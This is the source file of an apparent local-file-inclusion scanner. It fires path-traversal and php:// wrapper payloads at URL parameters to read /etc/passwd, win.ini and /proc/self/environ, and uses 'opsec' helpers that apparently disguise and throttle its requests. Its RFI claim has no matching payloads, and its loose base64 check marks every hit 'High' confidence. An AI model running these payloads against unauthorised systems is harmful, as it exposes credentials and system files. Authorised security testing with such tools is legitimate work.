"""
tools/lfi_scanner.py
Local File Inclusion (LFI) and Remote File Inclusion (RFI) detection.

Tests URL parameters with path traversal and file inclusion payloads,
then checks the response for leaked file content.
"""
import re
import requests
import urllib3
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from opsec import get_headers, opsec_sleep

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_TIMEOUT = 10


@dataclass
class LFIFinding:
    parameter:        str
    payload:          str
    evidence:         str
    type:             str   # "LFI" | "RFI"
    confidence:       str   # "High" | "Medium"
    response_snippet: str


@dataclass
class LFIResult:
    success:  bool
    target:   str
    findings: list[LFIFinding] = field(default_factory=list)
    error:    str = ""

    @property
    def has_findings(self) -> bool:
        return bool(self.findings)

    @property
    def confirmed(self) -> list[LFIFinding]:
        return [f for f in self.findings if f.confidence == "High"]


# ── Payloads ──────────────────────────────────────────────────────────────────

_LFI_PAYLOADS: list[tuple[str, str]] = [
    # Unix /etc/passwd
    ("../../../etc/passwd",                    "LFI"),
    ("../../../../etc/passwd",                 "LFI"),
    ("../../../../../etc/passwd",              "LFI"),
    ("../../../../../../etc/passwd",           "LFI"),
    ("/etc/passwd",                            "LFI"),
    ("....//....//....//etc/passwd",           "LFI"),
    ("..%2F..%2F..%2Fetc%2Fpasswd",           "LFI"),
    ("..%252F..%252F..%252Fetc%252Fpasswd",    "LFI"),
    ("%2F%2F%2Fetc%2Fpasswd",                 "LFI"),
    # Windows
    ("..\\..\\..\\windows\\win.ini",           "LFI"),
    ("..%5C..%5C..%5Cwindows%5Cwin.ini",      "LFI"),
    ("C:\\windows\\win.ini",                   "LFI"),
    ("C:/windows/win.ini",                     "LFI"),
    # PHP wrappers
    ("php://filter/convert.base64-encode/resource=index.php", "LFI"),
    ("php://input",                            "LFI"),
    # Proc/self
    ("/proc/self/environ",                     "LFI"),
    ("/proc/version",                          "LFI"),
]

# Evidence patterns: (regex, label)
_EVIDENCE_PATTERNS: list[tuple[str, str]] = [
    (r"root:.*?:/bin/",                     "/etc/passwd content"),
    (r"daemon:.*?:/usr/sbin",               "/etc/passwd content"),
    (r"\[extensions\]|for 16-bit app",      "Windows win.ini content"),
    (r"Linux version \d+\.\d+",             "/proc/version content"),
    (r"USER=|HOME=|SHELL=",                 "/proc/self/environ content"),
    (r"[A-Za-z0-9+/]{40,}={0,2}",          "Base64 encoded PHP source (php://filter)"),
]


def _inject(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def scan_lfi(url: str) -> LFIResult:
    """
    Test all URL parameters of *url* for LFI/RFI vulnerabilities.
    """
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    parsed = urlparse(url)
    params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
    if not params:
        return LFIResult(
            success=False, target=url,
            error="No URL parameters found. Provide a URL like http://target.com/page?file=home",
        )

    session = requests.Session()
    session.verify = False
    session.headers.update(get_headers())

    findings: list[LFIFinding] = []
    seen: set[tuple[str, str]] = set()

    for param in params:
        for payload, vuln_type in _LFI_PAYLOADS:
            test_url = _inject(url, param, payload)
            try:
                r = session.get(test_url, timeout=_TIMEOUT, allow_redirects=False)
                opsec_sleep()
                body = r.text[:6000]

                for pattern, label in _EVIDENCE_PATTERNS:
                    m = re.search(pattern, body)
                    if m:
                        key = (param, label)
                        if key not in seen:
                            seen.add(key)
                            snippet_start = max(0, m.start() - 40)
                            snippet = body[snippet_start:m.start() + 120].strip()
                            findings.append(LFIFinding(
                                parameter=param,
                                payload=payload,
                                evidence=label,
                                type=vuln_type,
                                confidence="High",
                                response_snippet=snippet[:300],
                            ))
                        break

            except requests.RequestException:
                continue

    return LFIResult(success=True, target=url, findings=findings)
